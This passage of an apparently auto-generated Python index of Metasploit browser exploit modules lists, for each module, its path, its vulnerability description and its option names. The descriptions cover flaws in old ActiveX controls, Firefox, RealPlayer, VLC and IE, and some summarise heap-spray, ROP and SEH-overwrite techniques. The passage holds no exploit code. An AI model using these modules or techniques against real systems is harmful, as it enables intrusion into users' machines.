			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_browser_mcafee_mvt_exec(object):
		"""
		
          This modules exploits a vulnerability found in McAfee Virtual Technician's
        MVTControl.  This ActiveX control can be abused by using the GetObject() function
        to load additional unsafe classes such as WScript.Shell, therefore allowing remote
        code execution under the context of the user.
      
		"""

		path = 'windows/browser/mcafee_mvt_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_mozilla_mchannel(object):
		"""
		
          This module exploits an use after free vulnerability in Mozilla
        Firefox 3.6.16. An OBJECT Element mChannel can be freed via the
        OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel
        becomes a dangling pointer and can be reused when setting the OBJECTs
        data attribute. (Discovered by regenrecht). This module uses heapspray
        with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,
        a windows 7 target was provided using JAVA 6 and below to avoid aslr.
      
		"""

		path = 'windows/browser/mozilla_mchannel'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_realplayer_smil(object):
		"""
		
          This module exploits a stack buffer overflow in RealNetworks RealPlayer 10 and 8.
        By creating a URL link to a malicious SMIL file, a remote attacker could
        overflow a buffer and execute arbitrary code.
        When using this module, be sure to set the URIPATH with an extension of '.smil'.
        This module has been tested with RealPlayer 10 build 6.0.12.883 and RealPlayer 8
        build 6.0.9.584.
      
		"""

		path = 'windows/browser/realplayer_smil'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_vlc_mms_bof(object):
		"""
		
          This module exploits a buffer overflow in VLC media player VLC media player prior
        to 2.0.0. The vulnerability is due to a dangerous use of sprintf which can result
        in a stack buffer overflow when handling a malicious MMS URI.

        This module uses the browser as attack vector. A specially crafted MMS URI is
        used to trigger the overflow and get flow control through SEH overwrite. Control
        is transferred to code located in the heap through a standard heap spray.

        The module only targets IE6 and IE7 because no DEP/ASLR bypass has been provided.
      
		"""

		path = 'windows/browser/vlc_mms_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_creative_software_cachefolder(object):
		"""
		
          This module exploits a stack buffer overflow in Creative Software AutoUpdate Engine. When
        sending an overly long string to the cachefolder() property of CTSUEng.ocx
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/creative_software_cachefolder'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_aim_goaway(object):
		"""
		
          This module exploits a flaw in the handling of AOL Instant
        Messenger's 'goaway' URI handler.  An attacker can execute
        arbitrary code by supplying a overly sized buffer as the
        'message' parameter.  This issue is known to affect AOL Instant
        Messenger 5.5.
      
		"""

		path = 'windows/browser/aim_goaway'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_macrovision_unsafe(object):
		"""
		
        This module allows attackers to execute code via an unsafe methods in Macrovision InstallShield 2008.
      
		"""

		path = 'windows/browser/macrovision_unsafe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_mozilla_nstreerange(object):
		"""
		
        This module exploits a code execution vulnerability in Mozilla Firefox
        3.6.x <= 3.6.16 and 3.5.x <= 3.5.17 found in nsTreeSelection.
        By overwriting a subfunction of invalidateSelection it is possible to free the
        nsTreeRange object that the function currently operates on.
        Any further operations on the freed object can result in remote code execution.
        Utilizing the call setup the function provides it's possible to bypass DEP
        without the need for a ROP. Sadly this exploit is still either dependent
        on Java or bound by ASLR because Firefox doesn't employ any ASLR-free
        modules anymore.
      
		"""

		path = 'windows/browser/mozilla_nstreerange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			required_SEHProlog = 'SEHProlog'
			required_CreateThread = 'CreateThread'
			OBFUSCATE = 'OBFUSCATE'
			required_BaseOffset = 'BaseOffset'
			required_SpraySize = 'SpraySize'
			required_SprayCount = 'SprayCount'
			required_SetBP = 'SetBP'
			required_Crash = 'Crash'

	class windows_browser_systemrequirementslab_unsafe(object):
		"""
		
          This module allows attackers to execute code via an unsafe method in
        Husdawg, LLC. System Requirements Lab ActiveX Control (sysreqlab2.dll 2.30.0.0)
      
		"""

		path = 'windows/browser/systemrequirementslab_unsafe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_crystal_reports_printcontrol(object):
		"""
		
          This module exploits a heap based buffer overflow in the CrystalPrintControl
        ActiveX, while handling the ServerResourceVersion property. The affected control
        can be found in the PrintControl.dll component as included with Crystal Reports
        2008. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3
        and IE 8 on Windows 7 SP1. The module uses the msvcr71.dll library, loaded by the
        affected ActiveX control, to bypass DEP and ASLR.
      
		"""

		path = 'windows/browser/crystal_reports_printcontrol'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_xmplay_asx(object):
		"""
		
          This module exploits a stack buffer overflow in XMPlay 3.3.0.4.
        The vulnerability is caused due to a boundary error within
        the parsing of playlists containing an overly long file name.
        This module uses the ASX file format.
      
		"""

		path = 'windows/browser/xmplay_asx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_flash_filters_type_confusion(object):
		"""
		
        This module exploits a type confusion vulnerability found in the ActiveX
        component of Adobe Flash Player. This vulnerability was found exploited
        in the wild in November 2013. This module has been tested successfully
        on IE 6 to IE 10 with Flash 11.7, 11.8 and 11.9 prior to 11.9.900.170
        over Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/browser/adobe_flash_filters_type_confusion'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_mswhale_checkforupdates(object):
		"""
		
          This module exploits a stack buffer overflow in Microsoft Whale Intelligent Application
        Gateway Whale Client. When sending an overly long string to CheckForUpdates()
        method of WhlMgr.dll (3.1.502.64) an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/mswhale_checkforupdates'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_realplayer_cdda_uri(object):
		"""
		
          This module exploits a initialization flaw within RealPlayer 11/11.1 and
        RealPlayer SP 1.0 - 1.1.4. An abnormally long CDDA URI causes an object
        initialization failure. However, this failure is improperly handled and
        uninitialized memory executed.
      
		"""

		path = 'windows/browser/realplayer_cdda_uri'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_safari_xslt_output(object):
		"""
		
          This module exploits a file creation vulnerability in the Webkit
        rendering engine. It is possible to redirect the output of a XSLT
        transformation to an arbitrary file. The content of the created file must be
        ASCII or UTF-8. The destination path can be relative or absolute. This module
        has been tested on Safari and Maxthon. Code execution can be acheived by first
        uploading the payload to the remote machine in VBS format, and then upload a MOF
        file, which enables Windows Management Instrumentation service to execute the VBS.
      
		"""

		path = 'windows/browser/safari_xslt_output'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_pcvue_func(object):
		"""
		
        This module exploits a function pointer control within SVUIGrd.ocx of PcVue 10.0.
        By setting a dword value for the SaveObject() or LoadObject(), an attacker can
        overwrite a function pointer and execute arbitrary code.
      
		"""

		path = 'windows/browser/pcvue_func'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			FILENAME = 'FILENAME'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_mcafee_mcsubmgr_vsprintf(object):
		"""
		
          This module exploits a flaw in the McAfee Subscription Manager ActiveX control.
        Due to an unsafe use of vsprintf, it is possible to trigger a stack buffer overflow by
        passing a large string to one of the COM-exposed routines, such as IsAppExpired.
        This vulnerability was discovered by Karl Lynn of eEye.
      
		"""

		path = 'windows/browser/mcafee_mcsubmgr_vsprintf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms11_081_option(object):
		"""
		
          This module exploits a vulnerability in Microsoft Internet Explorer.  A memory
        corruption may occur when the Option cache isn't updated properly, which allows
        other JavaScript methods to access a deleted Option element, and results in code
        execution under the context of the user.
      
		"""

		path = 'windows/browser/ms11_081_option'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ca_brightstor_addcolumn(object):
		"""
		
          The CA BrightStor ARCserve Backup ActiveX control (ListCtrl.ocx) is vulnerable to a stack-based
        buffer overflow. By passing an overly long argument to the AddColumn() method, a remote attacker
        could overflow a buffer and execute arbitrary code on the system.
      
		"""

		path = 'windows/browser/ca_brightstor_addcolumn'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_winamp_playlist_unc(object):
		"""
		
          This module exploits a vulnerability in the Winamp media player.
        This flaw is triggered when a audio file path is specified, inside a
        playlist, that consists of a UNC path with a long computer name. This
        module delivers the playlist via the browser. This module has only
        been successfully tested on Winamp 5.11 and 5.12.
      
		"""

		path = 'windows/browser/winamp_playlist_unc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
